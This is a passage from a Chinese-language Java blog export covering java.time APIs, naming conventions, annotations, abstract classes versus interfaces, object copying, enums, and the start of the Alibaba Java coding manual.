java.lang.NumberFormatException: For input string: ""	at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)	at java.base/java.lang.Long.parseLong(Long.java:702)	at java.base/java.lang.Long.parseLong(Long.java:817)	at java.base/java.text.DigitList.getLong(DigitList.java:195)	at java.base/java.text.DecimalFormat.parse(DecimalFormat.java:2093)	at java.base/java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1913)	at java.base/java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1529)	at java.base/java.text.DateFormat.parse(DateFormat.java:386)	at com.hots.TimeTest.lambda$main$0(TimeTest.java:15)	at java.base/java.lang.Thread.run(Thread.java:844)Thu May 05 00:00:00 CST 2016
java.time.LocalDate  此类是不可吧变更且线程安全的。并且和时间概念区分开。
LocalDate localDate = LocalDate.of(2019,1,7);System.out.println(localDate.getMonth());System.out.println(localDate.getMonthValue());System.out.println(localDate.lengthOfMonth());



方法
说明




LocalDate.now()
获取当前日期


LocalDate.of(intyear,intmonth,intdayOfMonth)
根据参数设置日期，参数分别为年，月，日


localDate.getDayOfMonth()
获取当前日期是所在月的第几天


localDate.getDayOfWeek()
获取当前日期是星期几（星期的英文全称）


localDate.getDayOfYear()
获取当前日期是所在年的第几天


localDate.getMonth()
获取当前日期所在月份（月份的英文全称）


localDate.getMonthValue()
获取当前日期所在月份的数值


localDate.lengthOfMonth()
获取当前日期所在月份有多少天


localDate.lengthOfYear()
获取当前日期所在年有多少天


localDate.isLeapYear()
获取当前日期所在年是否是闰年


localDate.withDayOfMonth(intdayOfMonth)
将参数中的"日"替换localDate中的"日"


localDate.withDayOfYear(intdayOfYear)
将参数中的天数替换localDate中的天数


localDate.withMonth(intmonth)
将参数中的"月"替换localDate中的"月"


localDate.withYear(intyear)
将参数中的"年"替换localDate中的"年"


localDate.minusDays(longdays)
将当前日期减一天


localDate.minusWeeks(longweeks)
将当前日期减一周


localDate.minusMonths(longmonths)
将当前日期减一月


localDate.minusYears(longyears)
将当前日期减一年


localDate.plusDays(longdays)
将当前日期加一天



java.time.LocalTime



方法
说明




LocalTime.now()
获取当前时间


LocalTime.of(inthour,intminute)
根据参数设置时间，参数分别为时，分


LocalTime.of(inthour,intminute,intsecond)
根据参数设置时间，参数分别为时，分，秒


localTime.getHour()
获取当前时间的小时数


localTime.getMinute()
获取当前时间的分钟数


localTime.getSecond()
获取当前时间的秒数


localTime.withHour(inthour)
将参数中的"小时"替换localTime中的"小时"


localTime.withMinute(intminute)
将参数中的"分钟"替换localTime中的"分钟"


localTime.withSecond(intsecond)
将参数中的"秒"替换localTime中的"秒"


localTime.minusHours(longhours)
将当前时间减一小时


localTime.minusMinutes(longminutes)
将当前时间减一分钟


localTime.minusSeconds(longseconds)
将当前时间减一秒


localTime.plusHours(longhours)
将当前时间加一小时


localTime.plusMinutes(longminutes)
将当前时间加一分钟


localTime.plusSeconds(longseconds)
将当前时间加一秒



java.time.LocalDateTime
LocalDate localDate = LocalDate.now();LocalTime time = LocalTime.now();LocalDateTime localDateTime = LocalDateTime.of(localDate, time);System.out.println(localDateTime.toString());LocalDateTime now = LocalDateTime.now();System.out.println(now);
java.time.Instant 机器时间
Instant start = Instant.now();Thread.sleep(1000L);Instant end = Instant.now();Duration duration = Duration.between(start, end);System.out.println(duration.toMillis());System.out.println(duration.toNanos());
java.time.Duration
LocalTime time = LocalTime.now();LocalTime beforeTime = time.minusHours(1);Duration duration = Duration.between(time, beforeTime);System.out.println(duration.toHours());
java.time.Period
Period period = Period.between(LocalDate.of(2014, 1, 10), LocalDate.of(2016, 1, 10));System.out.println(period.getMonths());System.out.println(period.getDays());System.out.println(period.getYears());
java.time.temporal.TemporalAdjusters 时间调节器
LocalDateTime now = LocalDateTime.now();//获取当月第一天System.out.println("当月第一天："+now.with(TemporalAdjusters.firstDayOfMonth()));//获取下月第一天System.out.println("下月第一天："+now.with(TemporalAdjusters.firstDayOfNextMonth()));//获取明年第一天System.out.println("明年第一天："+now.with(TemporalAdjusters.firstDayOfNextYear()));//获取本年第一天System.out.println("本年第一天："+now.with(TemporalAdjusters.firstDayOfYear()));//获取当月最后一天System.out.println("当月最后一天："+now.with(TemporalAdjusters.lastDayOfMonth()));//获取本年最后一天System.out.println("本年最后一天："+now.with(TemporalAdjusters.lastDayOfYear()));//获取当月第三周星期五System.out.println("当月第三周星期五："+now.with(TemporalAdjusters.dayOfWeekInMonth(3, DayOfWeek.FRIDAY)));//获取上周一System.out.println("上周一："+now.with(TemporalAdjusters.previous(DayOfWeek.MONDAY)));//获取下周日System.out.println("下周日："+now.with(TemporalAdjusters.next(DayOfWeek.SUNDAY)));]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java命名规范</title>
    <url>/20230317/1761bce2.html</url>
    <content><![CDATA[Java命名规范
泛型类
在书写泛型类时，通常做以下的约定：

E表示Element，通常用在集合中；
ID用于表示对象的唯一标识符类型
T表示Type(类型)，通常指代类；
K表示Key(键), 通常用于Map中；
V表示Value(值),通常用于Map中，与K结对出现；
N表示Number,通常用于表示数值类型；
？表示不确定的Java类型；
X用于表示异常；
U,S表示任意的类型。

速记Java开发中的各种O
通过一张表和图快速对Java中的BO,DTO,DAO,PO,POJO,VO之间的含义，区别以及联系进行梳理。



名称
使用范围
解释说明




BO
用于Service,Manager,Business等业务相关类的命名
Business Object业务处理对象，主要作用是把业务逻辑封装成一个对象。


DTO
经过加工后的PO对象，其内部属性可能增加或减少
Data Transfer  Object数据传输对象，主要用于远程调用等需要大量传输数据的地方，例如，可以将一个或多个PO类的部分或全部属性封装为DTO进行传输


DAO
用于对数据库进行读写操作的类进行命名
Data Access  Object数据访问对象，主要用来封装对数据库的访问，通过DAO可以将POJO持久化为PO，也可以利用PO封装出VO和DTO


PO
Bean,Entity等类的命名
Persistant  Object持久化对象，数据库表中的数据在Java对象中的映射状态，可以简单的理解为一个PO对象即为数据库表中的一条记录


POJO
POJO是DO/DTO/BO/VO的统称
Plain Ordinary Java Object  简单Java对象，它是一个简单的普通Java对象，禁止将类命名为XxxxPOJO


VO
通常是视图控制层和模板引擎之间传递的数据对象
Value Object  值对象，主要用于视图层，视图控制器将视图层所需的属性封装成一个对象，然后用一个VO对象在视图控制器和视图之间进行数据传输。


AO
应用层对象
Application Object，在Web层与Service层之间抽象的复用对象模型，很少用。



下面将通过一张图来理解上述几种O之间相互转换的关系：

]]></content>
      <categories>
        <category>后端</category>
        <category>编程规范</category>
      </categories>
      <tags>
        <tag>编程规范</tag>
      </tags>
  </entry>
  <entry>
    <title>Java注解</title>
    <url>/20221027/7039576b.html</url>
    <content><![CDATA[标准注解
Java的三种标准注解分别是@Override、@Deprecated和@Suppress Warnings。Java SE55内置了三种，定义在 java.lang中的注解：

@Override： 用在方法上，当我们想重写一个方法时，在方法上加 @Override，当我们方法的名字出错时，编译器就会报错。
@SuppressWarnings ：用来压制程序中出来的警告，比如在没有用泛型或是方法已经过时的时候。
@Deprecated ：用来表示某个类或属性或方法已经过时，不想别人再用时，在属性和方法上用 @Deprecated 修饰。如果程序员使用了注解为它的元素，那么编译器会发出警告信息。

元注解

元注解，就是用来中声明注解类型时需要使用到的注解。Java提供了四种元注解，它们分别是@Target、@Retention、@Documented和@Inherited。

@Inherited
注解源码
@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Inherited {}
使用测试
来源：https://blog.csdn.net/snow_crazy/article/details/39381695

Inherited作用是，使用此注解声明出来的自定义注解，在使用此自定义注解时，如果注解在类上面时，子类会自动继承此注解，否则的话，子类不会继承此注解。
这里一定要记住，使用Inherited声明出来的注解，只有在类上使用时才会有效，对方法，属性等其他无效



注解定义
  import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;/** * 声明的此注解使用了Inherited元注解，表示此注解用在类上时，会被子类所继承 */@Retention(RetentionPolicy.RUNTIME)@Inheritedpublic @interface InheritedTest {    String value();}
  import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;@Retention(RetentionPolicy.RUNTIME)public @interface InheritedTest2 {    String value();}


注解使用
  /** * 父类 */@InheritedTest("使用Inherited的注解 class")@InheritedTest2("未使用Inherited的注解 class")public class Parent {    @InheritedTest("使用Inherited的注解 method")    @InheritedTest2("未使用Inherited的注解 method")    public void method() {    }    @InheritedTest("使用Inherited的注解 method2")    @InheritedTest2("未使用Inherited的注解 method2")    public void method2() {    }    @InheritedTest("使用Inherited的注解 method2")    public void method3() {    }    @InheritedTest2("未使用Inherited的注解 method2")    public void method4() {    }    @InheritedTest("使用Inherited的注解 field")    @InheritedTest2("未使用Inherited的注解 field")    public String a;    @InheritedTest("使用Inherited的注解 field")    @InheritedTest2("未使用Inherited的注解 field")    public String b;}
  public class Child extends Parent {    @Override    public void method() {    }    @Override    public void method3() {    }    public String a;}


注解测试
  import java.lang.reflect.Field;import java.lang.reflect.Method;public class Test {    public static void main(String[] args) throws NoSuchMethodException, SecurityException, NoSuchFieldException {        Class&lt;Child&gt; clazz = Child.class;        //对类进行测试        System.out.println("对类进行测试");        if (clazz.isAnnotationPresent(InheritedTest.class)) {            System.out.println(clazz.getAnnotation(InheritedTest.class).value());        }        if (clazz.isAnnotationPresent(InheritedTest2.class)) {            System.out.println(clazz.getAnnotation(InheritedTest2.class).value());        }        System.out.println();        //对方法1 进行测试（子类覆写父类）        testMethod(clazz.getMethod("method", null), "（子类覆写父类）");        //对方法2 进行测试        testMethod(clazz.getMethod("method2", null), "（子类未覆写父类）");        //对方法3 进行测试        testMethod(clazz.getMethod("method3", null), "（子类覆写父类）");        //对方法4 进行测试        testMethod(clazz.getMethod("method4", null), "（子类未覆写父类）");        //对属性测试        testField(clazz.getField("a"), "（子类覆写父类）");        testField(clazz.getField("b"), "（子类未覆写父类）");    }    private static void testMethod(Method method, String desc) {        System.out.println("对方法：" + method.getName() + "，进行测试。" + desc);        if (method.isAnnotationPresent(InheritedTest.class)) {            System.out.println(method.getAnnotation(InheritedTest.class).value());        }        if (method.isAnnotationPresent(InheritedTest2.class)) {            System.out.println(method.getAnnotation(InheritedTest2.class).value());        }        System.out.println();    }    private static void testField(Field field, String desc) {        System.out.println("对属性：" + field.getName() + "，进行测试");        if (field.isAnnotationPresent(InheritedTest.class)) {            System.out.println(field.getAnnotation(InheritedTest.class).value());        }        if (field.isAnnotationPresent(InheritedTest2.class)) {            System.out.println(field.getAnnotation(InheritedTest2.class).value());        }        System.out.println();    }}
测试结果：
  对类进行测试使用Inherited的注解 class对方法：method，进行测试。（子类覆写父类）对方法：method2，进行测试。（子类未覆写父类）使用Inherited的注解 method2未使用Inherited的注解 method2对方法：method3，进行测试。（子类覆写父类）对方法：method4，进行测试。（子类未覆写父类）未使用Inherited的注解 method2对属性：a，进行测试对属性：b，进行测试使用Inherited的注解 field未使用Inherited的注解 field


@Retention

@Retention用来定义该注解在哪一个级别可用，在源代码中(SOURCE)、类文件中(CLASS)或者运行时(RUNTIME)。

注解源码
@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Retention {    /**     * Returns the retention policy.     * @return the retention policy     */    RetentionPolicy value();}
package java.lang.annotation;/** * Annotation retention policy.  The constants of this enumerated type * describe the various policies for retaining annotations.  They are used * in conjunction with the {@link Retention} meta-annotation type to specify * how long annotations are to be retained. * * @author  Joshua Bloch * @since 1.5 */public enum RetentionPolicy {    /**     * Annotations are to be discarded by the compiler.     */    SOURCE,    /**     * Annotations are to be recorded in the class file by the compiler     * but need not be retained by the VM at run time.  This is the default     * behavior.     */    CLASS,    /**     * Annotations are to be recorded in the class file by the compiler and     * retained by the VM at run time, so they may be read reflectively.     *     * @see java.lang.reflect.AnnotatedElement     */    RUNTIME}
注解的作用
RetentionPolicy 决定了 Retention 注解应该如何去保留，也可理解为 @Retention 搭配枚举类型 RetentionPolicy 使用。
按生命周期来划分可分为3类：（这3个生命周期分别对应于：Java源文件(.java文件) —&gt; .class文件 —&gt; 内存中的字节码）


RetentionPolicy.SOURCE：（.java文件）注解只保留在源文件，当Java文件编译成 .class 文件的时候，被其标注的注解被遗弃；


RetentionPolicy.CLASS：（.class文件）注解被保留到class文件中，但jvm加载 .class 文件时候，被其标注的注解会被遗弃，这是默认的生命周期；


RetentionPolicy.RUNTIME：（内存中的字节码） 注解不仅被保留到 .class 文件中，jvm 加载 .class 文件之后，被其标注的注解仍然存在，所以这个时候才可能通过反射机制读取注解的信息，而前两个生命周期中，通过反射机制读取不到注解信息的；


注解生命周期的选择
首先要明确生命周期长度 RUNTIME &gt; CLASS &gt; SOURCE，所以后者能作用到的地方前者一定也能作用到，但是反过来，前者能作用到的地方后者就作用不到。


一般如果需要在运行时去动态获取注解信息，那只能用生命周期最长的 RUNTIME 标注了
比如以下源码中我们常用到的注解：@Transient、@Deprecated、@Documented、@Inherited、@Retention、@Target … 等等很多。


如果要在编译时进行一些预处理操作，就用 CLASS注解；(如下)
  package lombok;import java.lang.annotation.Documented;import java.lang.annotation.ElementType;import java.lang.annotation.Retention;import java.lang.annotation.RetentionPolicy;import java.lang.annotation.Target;/** * If put on a parameter, lombok will insert a null-check at the start of the method / constructor's body, throwing a * {@code NullPointerException} with the parameter's name as message. If put on a field, any generated method assigning * a value to this field will also produce these null-checks.  */@Target({ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.LOCAL_VARIABLE, ElementType.TYPE_USE})@Retention(RetentionPolicy.CLASS)@Documentedpublic @interface NonNull {}


如果只是做一些检查性的操作，比如源码中的 @Override、@SuppressWarnings、@Native、@Generated 等就是被 RetentionPolicy.SOURCE 标注的


@Target

@Target用来定义你的注解将应用于什么地方(例如是一个方法或者一个域)。

注解源码
@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.ANNOTATION_TYPE)public @interface Target {    /**     * Returns an array of the kinds of elements an annotation type     * can be applied to.     * @return an array of the kinds of elements an annotation type     * can be applied to     */    ElementType[] value();}
/** * The constants of this enumerated type provide a simple classification of the * syntactic locations where annotations may appear in a Java program. These * constants are used in {@link Target java.lang.annotation.Target} * meta-annotations to specify where it is legal to write annotations of a * given type. * * &lt;p&gt;The syntactic locations where annotations may appear are split into * &lt;em&gt;declaration contexts&lt;/em&gt; , where annotations apply to declarations, and * &lt;em&gt;type contexts&lt;/em&gt; , where annotations apply to types used in * declarations and expressions. * * &lt;p&gt;The constants {@link #ANNOTATION_TYPE} , {@link #CONSTRUCTOR} , {@link * #FIELD} , {@link #LOCAL_VARIABLE} , {@link #METHOD} , {@link #PACKAGE} , * {@link #PARAMETER} , {@link #TYPE} , and {@link #TYPE_PARAMETER} correspond * to the declaration contexts in JLS 9.6.4.1. * * &lt;p&gt;For example, an annotation whose type is meta-annotated with * {@code @Target(ElementType.FIELD)} may only be written as a modifier for a * field declaration. * * &lt;p&gt;The constant {@link #TYPE_USE} corresponds to the 15 type contexts in JLS * 4.11, as well as to two declaration contexts: type declarations (including * annotation type declarations) and type parameter declarations. * * &lt;p&gt;For example, an annotation whose type is meta-annotated with * {@code @Target(ElementType.TYPE_USE)} may be written on the type of a field * (or within the type of the field, if it is a nested, parameterized, or array * type), and may also appear as a modifier for, say, a class declaration. * * &lt;p&gt;The {@code TYPE_USE} constant includes type declarations and type * parameter declarations as a convenience for designers of type checkers which * give semantics to annotation types. For example, if the annotation type * {@code NonNull} is meta-annotated with * {@code @Target(ElementType.TYPE_USE)}, then {@code @NonNull} * {@code class C {...}} could be treated by a type checker as indicating that * all variables of class {@code C} are non-null, while still allowing * variables of other classes to be non-null or not non-null based on whether * {@code @NonNull} appears at the variable's declaration. * * @author  Joshua Bloch * @since 1.5 * @jls 9.6.4.1 @Target * @jls 4.1 The Kinds of Types and Values */public enum ElementType {    /** Class, interface (including annotation type), or enum declaration */    TYPE,    /** Field declaration (includes enum constants) */    FIELD,    /** Method declaration */    METHOD,    /** Formal parameter declaration */    PARAMETER,    /** Constructor declaration */    CONSTRUCTOR,    /** Local variable declaration */    LOCAL_VARIABLE,    /** Annotation type declaration */    ANNOTATION_TYPE,    /** Package declaration */    PACKAGE,    /**     * Type parameter declaration     *     * @since 1.8     */    TYPE_PARAMETER,    /**     * Use of a type     *     * @since 1.8     */    TYPE_USE}
@Documented

@Documented：注解表明这个注解应该被 javadoc工具记录。
默认情况下，javadoc是不包括注解的。但如果声明注解时指定了 @Documented，则它会被 javadoc 之类的工具处理，所以注解类型信息也会被包括在生成的文档中。是一个标记注解，没有成员。

]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>abstract class和interface的区别</title>
    <url>/20221027/f7c553a3.html</url>
    <content><![CDATA[



Abstract class
Interface




实例化
不能
不能


类
一种继承关系，一个类只能使用一次继承关系。可以通过继承多个接口实现多重继承
一个类可以实现多个interface


数据成员
可有自己的
静态的不能被修改即必须是static final，一般不在此定义


方法
可以私有的，非abstract方法，必须实现
不可有私有的，默认是public abstract 类型


变量
可有私有的，默认是friendly 型，其值可以在子类中重新定义，也可以重新赋值
不可有私有的，默认是public static final 型，且必须给其初值，实现类中不能重新定义，不能改变其值。


设计理念
表示的是“is-a”关系
表示的是“like-a”关系


实现
需要继承，要用 extends
要用 implements



​		abstract class 和 interface在Java语言中都是用来进行抽象类（本文中的抽象类并非从abstract class翻译而来，它表示的是一个抽象体，而abstract class为Java语言中用于定义抽象类的一种方法）定义的
定义

定义：abstract class

​		声明方法的存在而不去实现它的类被叫做抽象类（abstract class），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类中实现该类的情况。不能创建abstract 类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或抽象静态方法。
​		abstract 类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类。取而代之，在子类中实现该方法。知道其行为的其它类可以在类中实现这些方法。

定义：interface

​		接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现 这样的接口而获得。接口中的所有方法都是抽象的，没有一个有程序体。
​		接口只可以定义static final成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。 然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到 接口类型或从接口类型转换，instanceof 运算符可以用来决定某对象的类是否实现了接口。

接口可以继承接口。抽象类可以实现(implements)接口，抽象类是可以继承实体类，但前提是实体类必须有明确的构造函数。
接口更关注“能实现什么功能”，而不管“怎么实现的”。

相同点
A. 两者都是抽象类，都不能实例化。
B. interface实现类及abstrct class的子类都必须要实现已经声明的抽象方法。
不同点


interface需要实现，要用implements，而abstract class需要继承，要用extends。


一个类可以实现多个interface，但一个类只能继承一个abstract class。


interface强调特定功能的实现，而abstract class强调所属关系


尽管interface实现类及abstrct class的子类都必须要实现相应的抽象方法，但实现的形式不同。
interface中的每一个方法都是抽象方法，都只是声明的 (declaration, 没有方法体)，实现类必须要实现。
abstract class的子类可以有选择地实现。 这个选择有两点含义：

abastract class中并非所有的方法都是抽象的。只有那些冠有abstract的方法才是抽象的，子类必须实现。那些没有abstract的方法，在abstrct class中必须定义方法体。
abstract class的子类在继承它时，对非抽象方法既可以直接继承，也可以覆盖；而对抽象方法，可以选择实现，也可以通过再次声明其方法为抽象的方式，无需实现，留给其子类来实现，但此类必须也声明为抽象类。既是抽象类，当然也不能实例化。



abstract class是interface与class中介
​		interface是完全抽象的，只能声明方法，而且只能声明pulic的方法，不能声明private及protected的方法，不能定义方法体，也不能声明实例变量。然而，interface却可以声明常量变量，并且在JDK中不难找出这种例子。但将常量变量放在interface中违背了其作为接 口的作用而存在的宗旨，也混淆了interface与类的不同价值。如果的确需要，可以将其放在相应的abstract class或class中。
​		abstract class在interface及class中起到了承上启下的作用。一方面，abstract class是抽象的，可以声明抽象方法，以规范子类必须实现的功能；另一方面，它又可以定义缺省的方法体，供子类直接使用或覆盖。另外，它还可以定义自己 的实例变量，以供子类通过继承来使用。


应用场合


interface

类与类之前需要特定的接口进行协调，而不在乎其如何实现。
作为能够实现特定功能的标识存在，也可以是什么接口方法都没有的纯粹标识。
需要将一组类视为单一的类，而调用者只通过接口来与这组类发生联系。
需要实现特定的多项功能，而这些功能之间可能完全没有任何联系。



abstract class
==在既需要统一的接口，又需要实例变量或缺省的方法的情况下，就可以使用它==
最常见的有：

定义了一组接口，但又不想强迫每个实现类都必须实现所有的接口。可以用abstract class定义一组方法体，甚至可以是空方法体，然后由子类选择自己所感兴趣的方法来覆盖。
某些场合下，只靠纯粹的接口不能满足类与类之间的协调，还必需类中表示状态的变量来区别不同的关系。abstract的中介作用可以很好地满足这一点。
规范了一组相互协调的方法，其中一些方法是共同的，与状态无关的，可以共享的，无需子类分别实现；而另一些方法却需要各个子类根据自己特定的状态来实现特定的功能。



]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>对象之间相同属性的赋值</title>
    <url>/20221027/79cf73a2.html</url>
    <content><![CDATA[参考：Java 对象之间相同属性的赋值
Java中clone()与new的区别
区别
（1）在java中clone()与new都能创建对象。
（2）clone()不会调用构造方法；new会调用构造方法。
（3）clone()能快速创建一个已有对象的副本，即创建对象并且将已有对象中所有属性值克隆；
new只能在JVM中申请一个空的内存区域，对象的属性值要通过构造方法赋值。
注意：
（1）使用clone()类必须实现java.lang.Cloneable接口并重写Object类的clone()方法，如果没有实现Cloneable()接口将会抛出CloneNotSupportedException异常。（此类实现java.lang.Cloneable接口，指示Object.clone()方法可以合法的对该类实例进行按字段复制。）
（2）默认的Object.clone()方法是浅拷贝，创建好对象的副本然后通过“赋值”拷贝内容，如果类包含引用类型变量，那么原始对象和克隆对象的引用将指向相同的引用内容。
面试题：什么是浅拷贝？什么是深拷贝？

“浅拷贝”：默认的Object.clone()方法,对于引用类型成员变量拷贝只是拷贝“值”即地址，没有在堆中开辟新的内存空间。
“深拷贝”：重写clone()方法，对于引用类型成员变量，重新在堆中开辟新的内存空间。

BeanUtils.copyProperties：可以进行类型转换
import org.springframework.beans.BeanUtils;User src = new User(); User dest = new User(); BeanUtils.copyProperties(dest, src);
PropertyUtils.copyProperties：不会进行类型转换
使用Dozer
在pom.xml中增加依赖
&lt;dependency&gt;  &lt;groupId&gt;net.sf.dozer&lt;/groupId&gt;  &lt;artifactId&gt;dozer&lt;/artifactId&gt;  &lt;version&gt;5.5.1&lt;/version&gt;&lt;/dependency&gt;
Spring集成dozer
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE beans PUBLIC "-//SPRING//DTD BEAN//EN" "http://www.springframework.org/dtd/spring-beans.dtd"&gt;&lt;beans&gt;    &lt;bean id="baseMapper" class="org.dozer.spring.DozerBeanMapperFactoryBean"&gt;        &lt;property name="mappingFiles"&gt;            &lt;list&gt;                &lt;value&gt;classpath:mapping/dozer-mapping.xml&lt;/value&gt;            &lt;/list&gt;        &lt;/property&gt;    &lt;/bean&gt;&lt;/beans&gt;
使用baseMapper进行Bean的转换
@Autowired private Mapper baseMapper; private UserVO doToVo(UserDO userDO){       if(userDO == null) return null;       UserVO vo = baseMapper.map(userDO, UserVO.getClass());       if(userDO.getCompanyId != null) getCompany(vo);       return vo; }
通过以上的代码加配置，我们就实现了从DO转换到VO的部分操作，之所以说是部分操作，是因为我们在dozer-mapping.xml并没有做多余的配置，只是使用dozer将DO中和VO中共有的属性转换了过来。对于其他的类型不同或者名称不同等的转换可以参考官网例子通过设置dozer-mapping.xml文件来实现。
上面还有一个getCompany()没有实现。这个方法其实就是通过companyId查询出company实体，然后在赋值给UserVO中的company属性。
]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java枚举类型7种常见的用法</title>
    <url>/20221027/5296b9c2.html</url>
    <content><![CDATA[参考：Java 枚举(enum) 详解7种常见的用法
JDK1.5引入了枚举类型
用法一：常量
在JDK1.5 之前，我们定义常量都是： public static fianl… 。现在好了，有了枚举，可以把相关的常量分组到一个枚举类型里，而且枚举提供了比常量更多的方法。
public enum Color {  	  RED, GREEN, BLANK, YELLOW  } 
用法二：switch
JDK1.6之前的switch语句只支持int,char,enum类型，使用枚举，能让我们的代码可读性更强。
enum Signal {      GREEN, YELLOW, RED  }  public class TrafficLight {      Signal color = Signal.RED;      public void change() {          switch (color) {          case RED:              color = Signal.GREEN;              break;          case YELLOW:              color = Signal.RED;              break;          case GREEN:              color = Signal.YELLOW;              break;          }      }  } 
用法三：向枚举中添加新方法
如果打算自定义自己的方法，那么必须在enum实例序列的最后添加一个分号。而且 Java 要求必须先定义 enum 实例。
public enum Color {      RED("红色", 1), GREEN("绿色", 2), BLANK("白色", 3), YELLO("黄色", 4);      // 成员变量      private String name;      private int index;      // 构造方法      private Color(String name, int index) {          this.name = name;          this.index = index;  	}  	// 普通方法  	public static String getName(int index) {  		for (Color c : Color.values()) {  			if (c.getIndex() == index) {  				return c.name;  			}  		}  		return null;  	}  	// get set 方法  	public String getName() {  		return name;  	}  	public void setName(String name) {  		this.name = name;  	}  	public int getIndex() {  		return index;  	}  	public void setIndex(int index) {  		this.index = index;  	}  }  
用法四：覆盖枚举的方法
下面给出一个toString()方法覆盖的例子。
public enum Color {      RED("红色", 1), GREEN("绿色", 2), BLANK("白色", 3), YELLO("黄色", 4);      // 成员变量      private String name;      private int index;      // 构造方法      private Color(String name, int index) {          this.name = name;          this.index = index;  	}  	//覆盖方法  	@Override  	public String toString() {  		return this.index+"_"+this.name;  	}  }  
用法五：实现接口
所有的枚举都继承自java.lang.Enum类。
由于Java 不支持多继承，所以枚举对象不能再继承其他类。
public interface Behaviour {      void print();      String getInfo();  }  public enum Color implements Behaviour{      RED("红色", 1), GREEN("绿色", 2), BLANK("白色", 3), YELLO("黄色", 4);      // 成员变量      private String name;      private int index;  	// 构造方法  	private Color(String name, int index) {  		this.name = name;  		this.index = index;  	}  	//接口方法  	@Override  	public String getInfo() {  		return this.name;  	}  	//接口方法  	@Override  	public void print() {  		System.out.println(this.index+":"+this.name);  	}  }  
用法六：使用接口组织枚举
public interface Food {      enum Coffee implements Food{          BLACK_COFFEE,DECAF_COFFEE,LATTE,CAPPUCCINO      }      enum Dessert implements Food{          FRUIT, CAKE, GELATO      }  } 
用法七：关于枚举集合的使用
java.util.EnumSet和java.util.EnumMap是两个枚举集合。EnumSet保证集合中的元素不重复；EnumMap中的 key是enum类型，而value则可以是任意类型。关于这个两个集合的使用就不在这里赘述，可以参考JDK文档。
关于枚举的实现细节和原理请参考：
参考资料：《Thinking In Java》第四版
http://softbeta.iteye.com/blog/1185573
]]></content>
      <categories>
        <category>后端</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java开发手册【阿里巴巴】</title>
    <url>/20221025/ba2334ee.html</url>
    <content><![CDATA[


版本号
制定团队
更新日期
备注




1.7.0
阿里巴巴与全球 Java 社区开发者
2020.08.03
嵩山版，首次发布前后端规约









一、 编程规约
(一)  命名风格


【强制】代码中的命名均不能以下划线或美元符号开始，也不能以下划线或美元符号结束。    反例：_name / __name / $name / name_ / name$ / name__ 


【强制】所有编程相关的命名严禁使用拼音与英文混合的方式，更不允许直接使用中文的方式。
说明：正确的英文拼写和语法可以让阅读者易于理解，避免歧义。注意，纯拼音命名方式更要避免采用。
正例：ali / alibaba / taobao / cainiao/ aliyun/ youku / hangzhou  等国际通用的名称，可视同英文。
反例：DaZhePromotion [打折] / getPingfenByName() [评分] / String fw[福娃] / int  某变量 = 3


【强制】代码和注释中都要避免使用任何语言的种族歧视性词语。
正例：日本人 /  印度人 / blockList / allowList / secondary
反例：RIBENGUIZI / Asan / blackList / whiteList / slave


【强制】类名使用 UpperCamelCase 风格，但以下情形例外：DO / BO / DTO / VO / AO / PO / UID 等。
正例：ForceCode  /  UserDO  /  HtmlDTO  /  XmlService  /  TcpUdpDeal  /  TaPromotion
反例：forcecode  /  UserDo  /  HTMLDto  /  XMLService  /  TCPUDPDeal  /  TAPromotion


【强制】方法名、参数名、成员变量、局部变量都统一使用 lowerCamelCase 风格。     正例： localValue / getHttpMessage() / inputUserId


【强制】常量命名全部大写，单词间用下划线隔开，力求语义表达完整清楚，不要嫌名字长。
正例：MAX_STOCK_COUNT / CACHE_EXPIRED_TIME
反例：MAX_COUNT / EXPIRED_TIME


【强制】抽象类命名使用 Abstract 或 Base 开头；异常类命名使用 Exception 结尾；测试类 命名以它要测试的类的名称开始，以 Test 结尾。


【强制】类型与中括号紧挨相连来表示数组。
正例：定义整形数组 int[] arrayDemo。
反例：在 main 参数中，使用 String args[]来定义。


【强制】POJO 类中的任何布尔类型的变量，都不要加 is 前缀，否则部分框架解析会引起序列化错误。
说明：在本文 MySQL 规约中的建表约定第一条，表达是与否的变量采用 is_xxx 的命名方式，所以，需要在设置从 is_xxx 到 xxx 的映射关系。
反例：定义为基本数据类型 Boolean isDeleted 的属性，它的方法也是 isDeleted()，框架在反向解析的时 候，“误以为”对应的属性名称是 deleted，导致属性获取不到，进而抛出异常。


【强制】包名统一使用小写，点分隔符之间有且仅有一个自然语义的英语单词。包名统一使用单数形式，但是类名如果有复数含义，类名可以使用复数形式。
正例：应用工具类包名为 com.alibaba.ei.kunlun.aap.util、类名为 MessageUtils（此规则参考 spring 的 框架结构）


【强制】避免在子父类的成员变量之间、或者不同代码块的局部变量之间采用完全相同的命名， 使可理解性降低。
